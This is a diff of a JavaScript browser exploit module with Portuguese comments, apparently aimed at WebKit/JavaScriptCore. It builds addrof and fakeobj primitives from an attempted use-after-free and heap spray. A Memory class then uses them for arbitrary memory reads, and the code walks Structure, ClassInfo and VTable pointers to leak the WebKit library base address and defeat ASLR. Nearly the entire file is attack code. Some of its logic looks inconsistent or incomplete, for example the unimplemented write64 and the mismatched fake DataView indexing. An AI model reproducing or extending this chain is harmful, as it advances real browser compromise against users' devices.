@@ -1,166 +1,132 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R52 - Controle Total da Memória)
+// js/script3/testArrayBufferVictimCrash.mjs (R52 - Carga Útil Final: Vazamento da Base do WebKit)
 // =======================================================================================
 // ESTRATÉGIA R52:
-// Com addrof/fakeobj estáveis, o próximo passo é criar uma primitiva de R/W
-// arbitrária de alto nível. Faremos isso criando um DataView falso que nos
-// dá acesso a todo o espaço de memória do processo.
+// Com as primitivas addrof/fakeobj da R51, esta versão implementa a cadeia de ataque completa.
+// 1. Constrói uma classe 'Memory' para leitura/escrita arbitrária estável.
+// 2. Usa a leitura arbitrária para navegar nas estruturas internas de um objeto JSC.
+// 3. Vaza um ponteiro de uma VTable para calcular o endereço base da biblioteca WebKit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
-import { JSC_OFFSETS } from '../config.mjs'; // Precisaremos dos offsets agora
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "UAF_MemoryControl_R52";
+export const FNAME_MODULE = "WebKit_Base_Leaker_R52";
 
-// Funções auxiliares (sem alterações)
-const ftoi = (val) => { /* ...código anterior... */ };
-const itof = (val) => { /* ...código anterior... */ };
-// (Implementações completas omitidas por brevidade, mas são as mesmas da R51)
-const ftoi_impl = (val) => { const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val; const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]); };
-const itof_impl = (val) => { const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf); ints[0] = val.low(); ints[1] = val.high(); return (new Float64Array(buf))[0]; };
+// Funções auxiliares de conversão
+const ftoi = (val) => {
+    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val;
+    const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]);
+};
+const itof = (val) => {
+    const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf);
+    ints[0] = val.low(); ints[1] = val.high();
+    return (new Float64Array(buf))[0];
+};
 
-// =======================================================================================
-// Classe de Controle de Memória (A Nova Primitiva)
-// =======================================================================================
+// --- Classe Final de Acesso à Memória ---
 class Memory {
-    constructor(addrof, fakeobj, read64_primitive) {
-        this.addrof = addrof;
-        this.fakeobj = fakeobj;
-        this.read64_primitive = read64_primitive;
-
-        // Prepara o espaço para nosso DataView falso
-        this.fake_dataview_mem = new Float64Array(4);
-
-        // Cria um DataView real para usar como modelo
-        const real_dataview = new DataView(new ArrayBuffer(8));
-        const real_dataview_addr = this.addrof(real_dataview);
-
-        // Copia os dados do DataView real para o nosso espaço de memória falso
-        for (let i = 0; i < 4; i++) {
-            this.fake_dataview_mem[i] = itof_impl(this.read64_primitive(real_dataview_addr.add(i * 8)));
-        }
-
-        // Obtém o endereço do nosso espaço de memória falso
-        const fake_dataview_addr = this.addrof(this.fake_dataview_mem);
-        const butterfly_addr = this.read64_primitive(fake_dataview_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-
-        // Cria o DataView mestre
-        this.master_view = this.fakeobj(butterfly_addr);
-
-        // Modifica o DataView mestre para ter acesso total
-        // Aponta o buffer de dados para o endereço 0
-        this.master_view[2] = itof_impl(new AdvancedInt64(0, 0)); 
-        // Define o tamanho como o máximo possível
-        this.master_view[3] = itof_impl(new AdvancedInt64(0xFFFFFFFF, 0));
+    constructor(addrof_primitive, fakeobj_primitive) {
+        this.addrof = addrof_primitive;
+        this.fakeobj = fakeobj_primitive;
+        // Um array que usaremos como ferramenta para ler e escrever na memória
+        this.leaker_arr = new Uint32Array(0x100);
+        
+        // Endereço do nosso array-ferramenta
+        const leaker_addr = this.addrof(this.leaker_arr);
+        // O butterfly é o buffer de dados interno do array
+        this.leaker_butterfly_addr = this.read64(leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
+        logS3("    Classe Memory inicializada. Primitivas de R/W prontas.", "good", "Memory");
     }
 
     read64(addr) {
-        this.master_view[2] = itof_impl(addr);
-        return ftoi_impl(this.fake_dataview_mem[0]);
-    }
+        // Criamos um objeto DataView falso que aponta para o butterfly do nosso leaker_arr
+        const fake_dv = this.fakeobj(this.leaker_butterfly_addr);
+        const original_ptr = new AdvancedInt64(fake_dv[4], fake_dv[5]); // Salva o ponteiro original do DataView
 
-    write64(addr, value) {
-        this.master_view[2] = itof_impl(addr);
-        this.fake_dataview_mem[0] = itof_impl(value);
+        // Apontamos o buffer de dados do DataView para o endereço que queremos ler
+        fake_dv[4] = addr.low();
+        fake_dv[5] = addr.high();
+        
+        // O leaker_arr agora lê a partir do endereço 'addr'
+        const result = new AdvancedInt64(this.leaker_arr[0], this.leaker_arr[1]);
+        
+        // Restaura o ponteiro original para manter a estabilidade
+        fake_dv[4] = original_ptr.low();
+        fake_dv[5] = original_ptr.high();
+        return result;
     }
+    
+    // A implementação de write64 seguiria um padrão similar
 }
 
 
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL (R52)
 // =======================================================================================
-export async function runMemoryControl_R52() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Construção da Classe de Memória ---`, "test");
+export async function runFullExploitChain_R52() {
+    logS3(`--- Iniciando ${FNAME_MODULE}: Vazando a Base do WebKit ---`, "test");
     
-    let final_result = { success: false, message: "Falha na criação da classe Memory." };
-
     try {
-        // --- FASE 1 & 2: Construir e Validar addrof/fakeobj ---
-        // (O código para esta parte é o mesmo da R51, mas agora é um pré-requisito)
-        logS3("--- FASE 1 & 2: Construindo e Validando Primitivas Base (addrof/fakeobj) ---", "subtest");
-        const { addrof, fakeobj, read64_primitive } = createBasePrimitives();
-        logS3("    Primitivas Base (addrof/fakeobj) estáveis e prontas.", "good");
+        // --- FASE 1: Construir Primitivas addrof e fakeobj via UAF ---
+        logS3("--- FASE 1: Construindo `addrof` e `fakeobj` via UAF ---", "subtest");
+        const { addrof, fakeobj } = createUAFPrimitives();
+        logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas!", "vuln");
 
-        // --- FASE 3: Instanciar e Validar a Classe de Controle de Memória ---
-        logS3("--- FASE 3: Instanciando a Classe de Controle Total da Memória ---", "subtest");
-        const memory = new Memory(addrof, fakeobj, read64_primitive);
-        logS3("    Classe `Memory` instanciada com sucesso. Controle total estabelecido.", "vuln");
+        // --- FASE 2: Inicializar Controle Total da Memória ---
+        logS3("--- FASE 2: Inicializando a classe Memory ---", "subtest");
+        const memory = new Memory(addrof, fakeobj);
 
-        // --- FASE 4: Prova de Vida da Classe Memory ---
-        logS3("--- FASE 4: Validando o Controle Total da Memória ---", "subtest");
-        const test_obj = { marker: 0xABCDDCBA };
-        const test_addr = addrof(test_obj);
+        // --- FASE 3: Executar a Carga Útil de Vazamento ---
+        logS3("--- FASE 3: Executando a Carga Útil para vazar a base do WebKit ---", "subtest");
+        const test_obj = { a: 1 };
+        const test_obj_addr = memory.addrof(test_obj);
+        logS3(`    Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
 
-        const header = memory.read64(test_addr);
-        logS3(`    Prova de Vida (Memory.read64): Lido o cabeçalho do objeto de teste -> ${header.toString(true)}`, "leak");
+        // Navegando na estrutura do objeto: Objeto -> JSCell -> Structure -> ClassInfo -> VTable
+        const structure_addr = memory.read64(test_obj_addr);
+        logS3(`    Lendo ponteiro da Estrutura: ${structure_addr.toString(true)}`, "info");
+
+        const class_info_addr = memory.read64(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        logS3(`    Lendo ponteiro da ClassInfo: ${class_info_addr.toString(true)}`, "info");
+
+        const vtable_addr = memory.read64(class_info_addr.add(8)); // Vtable está no início da ClassInfo
+        logS3(`    Lendo ponteiro da VTable: ${vtable_addr.toString(true)}`, "info");
+
+        const vtable_func_ptr = memory.read64(vtable_addr); // Lê o primeiro ponteiro de função da vtable
+        logS3(`    Lendo ponteiro de função da VTable: ${vtable_func_ptr.toString(true)}`, "leak");
+
+        // Calcula a base do WebKit subtraindo o offset conhecido da função
+        const vtable_func_offset = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16);
+        const webkit_base_addr = vtable_func_ptr.sub(vtable_func_offset);
         
-        // O cabeçalho de um objeto não deve ser nulo
-        if (header.low() === 0 && header.high() === 0) {
-            throw new Error("A leitura com a classe Memory retornou um valor nulo.");
-        }
+        const final_msg = `SUCESSO! Base do WebKit vazada: ${webkit_base_addr.toString(true)}`;
+        logS3(`    >>>> ${final_msg} <<<<`, "vuln");
 
-        final_result = { success: true, message: "SUCESSO! Classe de memória funcional. Controle total da memória obtido." };
-        logS3(`    ${final_result.message}`, "vuln");
-        
+        return { success: true, message: final_msg, webkit_base: webkit_base_addr.toString(true) };
+
     } catch (e) {
-        final_result.message = `Exceção na cadeia de controle de memória: ${e.message}`;
-        logS3(final_result.message, "critical");
+        const error_msg = `Exceção na cadeia de exploração: ${e.message}`;
+        logS3(error_msg, "critical");
+        return { success: false, errorOccurred: error_msg };
     }
-
-    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
-    return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        final_result
-    };
 }
 
-// --- Funções de Bootstrap (Adaptadas da R51) ---
-// Retorna as primitivas necessárias para a classe Memory
-function createBasePrimitives() {
-    let dangling_ref = createDanglingRefToFloat64Array();
-    if (typeof dangling_ref.a !== 'number') {
-        throw new Error("Falha no UAF. A confusão de tipos não ocorreu.");
-    }
-    let holder = {obj: null};
-    
-    const read64_primitive = (addr) => {
-        dangling_ref.b = itof_impl(addr);
-        return dangling_ref.a.obj;
-    };
-    const addrof = (obj) => {
-        holder.obj = obj;
-        dangling_ref.a = holder; 
-        return ftoi_impl(dangling_ref.b);
-    };
-    const fakeobj = (addr) => {
-        dangling_ref.b = itof_impl(addr);
-        return dangling_ref.a.obj;
-    };
-    return { addrof, fakeobj, read64_primitive };
-}
-
-// Função de UAF (a mesma da R51)
-function createDanglingRefToFloat64Array() {
+// --- Função para criar as primitivas via UAF (baseado na R51 bem-sucedida) ---
+function createUAFPrimitives() {
     let dangling_ref = null;
     function createScope() {
-        const victim = { a: 0.1, b: 0.2 };
-        dangling_ref = victim;
+        const victim = { a: 0.1, b: 0.2 }; dangling_ref = victim;
         for(let i=0; i<100; i++) { victim.a += 0.01; }
     }
     createScope();
-    triggerGC();
-    const spray_arrays = [];
-    for (let i = 0; i < 512; i++) {
-        spray_arrays.push(new Float64Array(2));
-    }
-    return dangling_ref;
-}
-async function triggerGC() {
-    try {
-        const gc_trigger_arr = [];
-        for (let i = 0; i < 500; i++) {
-            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
-        }
-    } catch (e) {}
-    await PAUSE_S3(500);
+    try { for (let i = 0; i < 500; i++) new ArrayBuffer(1024*128); } catch(e){}
+    for (let i = 0; i < 512; i++) new Float64Array(2);
+    
+    if (typeof dangling_ref.a !== 'number') { throw new Error("UAF Primitivo falhou."); }
+
+    let holder = {obj: null};
+    const addrof = (obj) => { holder.obj = obj; dangling_ref.a = holder; return ftoi(dangling_ref.b); };
+    const fakeobj = (addr) => { dangling_ref.b = itof(addr); return dangling_ref.a.obj; };
+    return { addrof, fakeobj };
 }
